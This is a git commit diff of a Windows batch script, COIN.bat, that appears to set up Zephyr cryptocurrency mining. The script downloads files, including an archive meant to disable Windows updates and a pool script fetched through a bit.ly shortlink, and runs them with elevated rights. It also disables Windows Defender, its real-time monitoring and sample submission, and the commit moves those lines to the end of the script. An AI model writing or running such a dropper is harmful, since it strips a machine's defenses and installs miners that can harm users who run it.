50fd1856fdbca4512f3760ea1dcf3e0654c4c6a5
GALVINVN <112307302+GALVINVN@users.noreply.github.com>
2024-12-29 18:14:39 +0700

    COIN.bat

--- COIN.bat
+++ COIN.bat
@@ -1,7 +1,4 @@
 @echo off
-powershell -NoProfile -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1"
-powershell -NoProfile -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'SubmitSamplesConsent' -Value 2"
-powershell -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
 powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-701.exe' -OutFile 'C:\winrar-x64-701.exe'"
 powershell -NoProfile -Command "Start-Process -FilePath 'C:\winrar-x64-701.exe' -ArgumentList '/S' -Verb RunAs"
 powershell -NoProfile -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/main/Disable-update-windows.rar -OutFile C:\Disable-update-windows.rar"
@@ -15,4 +12,7 @@ powershell -NoProfile -Command "Invoke-WebRequest -Uri https://bit.ly/zeph-pool 
 powershell -NoProfile -Command "Copy-Item -Path C:\zeph-pool.bat -Destination C:\Setup\Zephyr\zeph-pool.bat -Force"
 powershell -NoProfile -Command "Start-Sleep -Seconds 1"
 powershell -NoProfile -Command "Start-Process -FilePath 'C:\Setup\Zephyr\zeph-pool.bat' -ArgumentList '/S' -Verb RunAs"
+powershell -NoProfile -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1"
+powershell -NoProfile -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'SubmitSamplesConsent' -Value 2"
+powershell -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
 exit
